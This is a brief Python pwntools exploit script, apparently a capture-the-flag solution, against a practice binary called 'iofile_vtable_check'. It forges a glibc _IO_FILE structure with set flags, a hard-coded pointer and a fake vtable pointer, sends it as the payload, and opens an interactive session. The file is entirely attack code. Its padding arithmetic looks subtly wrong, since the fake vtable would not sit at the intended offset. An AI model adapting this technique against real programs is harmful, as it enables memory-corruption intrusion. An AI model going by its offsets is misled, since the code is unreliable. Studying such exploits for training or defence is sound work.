from pwn import *
p = process('iofile_vtable_check')
raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)

_IO_FILE = p64(0xfbad2488) #flags
_IO_FILE += p64(0)*((0x88 - 8)/8)
_IO_FILE += p64(0x602340) + p64(0)*(0xd8 - len(_IO_FILE))
_IO_FILE_plus = _IO_FILE + 'A'*8
payload = _IO_FILE_plus + p64(0)

p.sendline(payload)
p.interactive()
